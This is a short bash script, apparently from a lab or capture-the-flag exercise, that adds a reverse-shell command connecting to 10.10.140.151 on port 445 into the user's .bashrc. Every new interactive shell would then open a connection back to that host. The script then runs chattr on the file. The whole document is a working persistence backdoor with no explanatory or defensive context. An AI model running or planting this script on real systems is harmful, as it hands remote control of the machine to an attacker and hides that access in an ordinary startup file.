#!/bin/bash

echo "bash -i 2>/dev/null >& /dev/tcp/10.10.140.151/445 0>&1" >> .bashrc

chattr -i ./.bashrc